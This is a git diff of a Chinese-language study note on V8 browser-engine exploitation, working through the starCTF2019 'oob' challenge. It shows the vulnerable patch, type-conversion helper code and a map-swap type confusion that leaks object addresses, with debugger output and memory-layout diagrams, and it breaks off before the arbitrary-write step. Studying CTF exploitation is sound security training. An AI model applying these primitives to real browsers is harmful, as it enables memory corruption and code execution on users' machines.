@@ -39,14 +39,15 @@ title: V8 - PWN chromium 0x00
 > [!info]
 >
 > 1. JS 源码通过 **parser（分析器）转化为 AST（抽象语法树）**，再经过 **interpreter（解释器）解析为 bytecode（字节码）**
-> 2. 为了提高运行效率，**optimizing compiler（优化编辑器）负责生成 optimized code（优化后的机器码）** > ![V8-image03](static/V8-image03.png)
+> 2. 为了提高运行效率，**optimizing compiler（优化编辑器）负责生成 optimized code（优化后的机器码）**
+> ![V8-image03](static/V8-image03.png)
 
 可以把重点放在 AST 之后，其中优化的矛盾点在于：JS 代码可以在 **字节码** 或者优化后的 **机器码** 状态下执行，而生成字节码速度很 **快**，生成机器码就要 **慢** 一些。
 
 上述优化思路具体到 V8 引擎中也是一致的，不过命名方式有所区别：
 
 > [!info]
-> 有趣的是 V8 Engine 也有汽车引擎的意思，V8 发动机是内燃机汽车历史上浓墨重彩的一笔。而 V8 中 interpreter 过程称为 Ignition（点火），Optimized Compiler 称为 TurboFan（涡轮）：
+> 有趣的是 V8 Engine 也有汽车引擎的意思，V8 发动机是内燃机汽车历史上浓墨重彩的一笔。而 V8 中 interpreter 过程称为 Ignition（点火），Optimized Compiler 称为 TurboFan（涡扇）：
 > ![[static/V8-image04.png]]
 
 1. **解析**：V8 首先读取 JavaScript 代码，并将其解析成一个抽象语法树（AST）。这个阶段包括词法分析（将输入的字符流转换成标记或令牌）和语法分析（根据语言的语法规则构建 AST）。
@@ -66,19 +67,19 @@ v8 会记录下某条语法树的执行次数，当 v8 发现某条语法树执�
 
 V8 中的 JS 对象结构基本符合下面描述：
 
-```bash
-map:        定义了如何访问对象
-prototype： 对象的原型（如果有）
-elements：  对象元素的地址
-length：    长度
-properties：属性, 存有map和length
-```
+- map：定义了如何访问对象
+- prototype：对象的原型（如果有）
+- elements：对象元素的地址
+- length：长度
+- properties：属性, 存有map和length
 
 其中, elements 也是个对象（指向数组对象上方的指针），即 v8 先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的 elements 指向了存储元素内容的内存地址。
 
 ---
 
 # V8 Pwn Cheatsheet
+
+> 接下来把关注点放到题目及其利用上：
 
 ## Installation
 
@@ -154,11 +155,12 @@ source gdbinit_v8
 >
 > 即指针标记机制，用来区分指针、双精度数、SMI（immediate small integer）。
 
-> [!quote] > **Double**: Shown as the 64-bit binary representation without any changes
+> [!quote] 
+> - **Double**: Shown as the 64-bit binary representation without any changes
+> - **Smi**: Represented as value << 32, i.e. `0xdeadbeef` is represented as `0xdeadbeef00000000`
+> - **Pointers**: Represented as $addr | 1$, i.e. `0x2233ad9c2ed8` is represented as `0x2233ad9c2ed9`
 >
-> **Smi**: Represented as value << 32, i.e. `0xdeadbeef` is represented as `0xdeadbeef00000000`
->
-> **Pointers**: Represented as $addr | 1$, i.e. `0x2233ad9c2ed8` is represented as `0x2233ad9c2ed9`
+> 即 Double 类型在 v8 的内存中能保持原始数据，故利用过程中的任意地址读 / 写通常倾向于通过浮点数实现。
 
 ### JavaScript
 
@@ -184,26 +186,27 @@ graph TD;
 任意地址读写-->写入shellcode;
 ```
 
-## 常见漏洞点
+有如下常见漏洞点：
 
-1. JS code exectution:
-   - Type Confusions
-   - UaFs
-   - OOB Accesses
-2. Wasm:
-   - Incorrect parsing
-   - Signature mismatch
-3. JIT Compilation:
-   - JIT Spraying
-   - Deopt bugs
-4. GC & Memory Management:
-   - Heap corruption
-   - Incorrect memory handling
-5. DOM Interaction:
-   - Buffer ownership issues
-6. Execution stages & optimization pipeline:
-   - Structural optimization errors
-7. Sandbox violations/SBX
+> [!quote]
+> 1. JS code exectution:
+>    - Type Confusions
+>    - UaFs
+>    - OOB Accesses
+> 2. Wasm:
+>    - Incorrect parsing
+>    - Signature mismatch
+> 3. JIT Compilation:
+>    - JIT Spraying
+>    - Deopt bugs
+> 4. GC & Memory Management:
+>    - Heap corruption
+>    - Incorrect memory handling
+> 5. DOM Interaction:
+>    - Buffer ownership issues
+> 6. Execution stages & optimization pipeline:
+>    - Structural optimization errors
+> 7. Sandbox violations/SBX
 
 ## 例题：starCTF2019-OOB
 
@@ -223,19 +226,19 @@ ninja -C out.gn/x64.release d8
 
 这里有一点需要注意的是, 我们现在编译的 debug 版本调用 obj.oob() 时会触发异常退出, 因此只能在 release 版本下进行利用, debug 版本下调试帮助理解 JavaScript 对象结构。
 
-题目的漏洞点体现在 oob.diff 文件中:
+题目的漏洞点体现在 oob.diff 文件中，通过参数数量的不同分别提供了越界读和越界写的功能：
 
 ```c
-...
-line 33:    return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
-...
-line 39:    elements.set(length,value->Number());
-...
+// ... L33:
+    return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+// ... L39:
+    elements.set(length,value->Number());
+// ...
 ```
 
 即无论是读还是写, oob 方法都索引到了 `elements[length]` 的位置, 造成了数组越界漏洞。
 
-在具体利用时, 还是遵循着 pwn 题目的基本思路：
+在具体利用时, 还是遵循着常规 pwn 题目的基本思路：
 
 ```
 漏洞
@@ -248,46 +251,131 @@ line 39:    elements.set(length,value->Number());
 先来看几个类型转换的辅助函数:
 
 ```javascript
-var buf = new ArrayBuffer(16)
-var float64 = new Float64Array(buf)
-var bigUint64 = new BigUint64Array(buf)
+class Helpers {
+    constructor() {
+        this.buf = new ArrayBuffer(8);
+        this.f64 = new Float64Array(this.buf);
+        this.f32 = new Float32Array(this.buf);
+        this.u32 = new Uint32Array(this.buf);
+        this.u64 = new BigUint64Array(this.buf);
+        this.state = {};
+    }
 
-function f2i(f) {
-  // 浮点数表示为u64
-  float64[0] = f
-  return bigUint64[0]
-}
-function i2f(i) {
-  // u64直接表示为浮点数
-  bigUint64[0] = i
-  return float64[0]
-}
-function hex(x) {
-  return x.toString(16).padStart(16, "0")
+    ftoil(f) {
+        this.f64[0] = f;
+        return this.u32[0]
+    }
+
+    ftoih(f) {
+        this.f64[0] = f;
+        return this.u32[1]
+    }
+
+    itof(i) {
+        this.u32[0] = i;
+        return this.f32[0];
+    }
+
+    f64toi64(f) {
+        this.f64[0] = f;
+        return this.u64[0];
+    }
+
+    i64tof64(i) {
+        this.u64[0] = i;
+        return this.f64[0];
+    }
+
+    clean() {
+        this.state.fake_object.fill(0);
+    }
+
+    printhex(val) {
+        console.log('0x' + val.toString(16));
+    }
+
+    add_ref(object) {
+        this.state[this.i++] = object;
+    }
+
+    gc() {
+        new ArrayBuffer(0x7fe00000);
+        new ArrayBuffer(0x7fe00000);
+        new ArrayBuffer(0x7fe00000);
+        new ArrayBuffer(0x7fe00000);
+        new ArrayBuffer(0x7fe00000);
+    }
 }
 ```
 
 接下来是利用 oob() 实现类型混淆的思路:
 
-- 首先需要明白: JavaScript中对于对象（[对象结构的复习](#对象结构)）的解析依赖于 `map`：map 指向 `<Map(PACKED_ELEMENTS)>` 时 elements 中元素就会按照 obj 来解析，其他类型同理；
-- 而 oob() 不带参数（`args.at<Object>(0)` 永远是 self）, 就可以输出 `elements[length]`, oob(data) 就可以在 `elements[length]` 写入 data；
-- array 的 elements 也是对象, 在内存结构中, 往往体现为：elements 紧挨着 array, 即：**`elements[length]` 的位置上就是 array 的 `map`**
-- 因此可以考虑先读出 map, 再在另一种 array 的 map 处写入, 即实现了类型混淆.
+- 首先需要明白：JavaScript 中对于对象（[对象结构的复习](#对象结构)）的解析依赖于 `map`：map 指向 `<Map(PACKED_ELEMENTS)>` 时 elements 中元素就会按照 obj 来解析，其他类型同理；
+- 而 `oob()` 不带参数（`args.at<Object>(0)` 永远是 self），就可以输出 `elements[length]`，`oob(data)` 就可以在 `elements[length]` 写入 data；
+- array 的 elements 也是对象，在内存结构中，往往体现为：elements 紧挨着 array，即： ** `elements[length]` 的位置上就是 array 的 `map` ** ；
+- 因此可以考虑先读出 map，再在另一种 array 的 map 处写入，即实现了类型混淆。
 
-demo 如下:
+在**没有开启指针压缩**的情况下，对象的内存布局如下：
+
+- 测试代码：
 
 ```javascript
-var obj = {}
-var obj_list = [obj]
-var float_list = [4.3]
+let float_list = [4.3];
+%DebugPrint(float_list);
+```
 
-var obj_map = obj_list.oob()
-var float_map = float_list.oob()
+- 输出：
 
-obj_list.oob(float_map)
-var obj_addr = f2i(obj_list[0]) - 0x1n
-obj_list.oob(obj_map)
-;(console.log("[DEMO] addr of obj is: 0x" + hex(obj_addr)) % DebugPrint(obj)) % SystemBreak()
+```bash
+DebugPrint: 0x1c53f8e4f341: [JSArray]
+ - map: 0x1713bd502ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x0f9345bd1111 <JSArray[0]>
+ - elements: 0x1c53f8e4f371 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 1
+ - properties: 0x3155becc0c71 <FixedArray[0]> {
+    #length: 0x180e41d801a9 <AccessorInfo> (const accessor descriptor)
+ }
+ - elements: 0x1c53f8e4f371 <FixedDoubleArray[1]> {
+           0: 4.3
+ }
+```
+
+- gdb 中查看内存：
+
+```bash
+pwndbg> telescope 0x1c53f8e4f340
+00:0000│  0x1c53f8e4f340 —▸ 0x1713bd502ed9 ◂— 0x400003155becc01
+01:0008│  0x1c53f8e4f348 —▸ 0x3155becc0c71 ◂— 0x3155becc08
+02:0010│  0x1c53f8e4f350 —▸ 0x1c53f8e4f371 ◂— 0x3155becc14
+03:0018│  0x1c53f8e4f358 ◂— 0x100000000
+04:0020│  0x1c53f8e4f360 —▸ 0x3155becc5239 ◂— 0x200003155becc01
+05:0028│  0x1c53f8e4f368 —▸ 0xf9345be02e1 ◂— 0xc100003155becc5a
+06:0030│  0x1c53f8e4f370 —▸ 0x3155becc14f9 ◂— 0x3155becc01
+07:0038│  0x1c53f8e4f378 ◂— 0x100000000
+08:0040│  0x1c53f8e4f380 ◂— 0x4011333333333333
+```
+
+- 即对于 `FixedDoubleArray` 类型的对象，内存布局如下：
+
+```bash
++---------------------------+
+|          map              |
+|---------------------------|
+|        prototype          |
+|---------------------------|
+|        elements           |------+
+|---------------------------|      |
+|  length    |    retained  |      |
+|---------------------------|      |
+|          ...              |      |
+|          ...              |      |
+|---------------------------|      |
+|         map               | <----+
+|---------------------------|
+|         data              |
+|---------------------------|
+|          ...              |
++---------------------------+
 ```
 
 这样一来, 我们就可以开始考虑构造任意地址写了, 思路如下:
